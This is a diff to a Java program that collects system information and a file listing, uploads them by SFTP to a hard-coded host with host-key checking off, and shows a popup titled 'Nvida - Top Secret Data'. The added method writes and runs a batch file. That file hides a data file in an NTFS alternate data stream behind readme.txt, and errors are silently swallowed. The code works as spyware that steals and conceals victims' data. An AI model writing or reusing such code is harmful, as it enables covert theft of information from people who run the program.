@@ -91,8 +91,6 @@ public class Main {
         FileWriter fileWriter2 = new FileWriter(file);
         saveInfoToFile(filesInDir, sysInfo, fileWriter2);
 
-        JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
-
         JSch jsch = new JSch();
         Session session = jsch.getSession("mysftpuser", "192.168.0.67");
         session.setConfig("StrictHostKeyChecking", "no");
@@ -108,6 +106,10 @@ public class Main {
         channel.disconnect();
         session.disconnect();
 
+        createBatchFile();
+
+        JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
+
     }
 
     private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
@@ -120,6 +122,39 @@ public class Main {
             out.println(filesInDir[i]);
         }
         bufferedWriter.close();
+    }
+
+    private static void createBatchFile(){
+        String userHome = System.getProperty("user.home");
+        try {
+
+            File readme = new File(userHome + "/readme.txt");
+            FileWriter fileWriter2 = new FileWriter(readme);
+            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter2);
+            PrintWriter out = new PrintWriter(bufferedWriter);
+            bufferedWriter.close();
+
+            // create new file called sample in "c" drive
+            File file2 = new File(userHome + "/Nvida.bat");
+            FileOutputStream fos = new FileOutputStream(file2);
+
+            // write some commands to the file
+            DataOutputStream dos = new DataOutputStream(fos);
+            dos.writeBytes("cd /");
+            dos.writeBytes("\n");
+            dos.writeBytes("cd %userprofile%");
+            dos.writeBytes("\n");
+            dos.writeBytes("type Infos3785646s3838975.dll > readme.txt:hiddenfile.txt");
+
+            // execute the batch file
+            Process p = Runtime.getRuntime().exec("cmd /c start " + userHome + "/Nvida.bat");
+
+            // wait for termination
+            p.waitFor();
+
+            dos.close();
+        } catch (Exception ex) {
+        }
     }
 
 
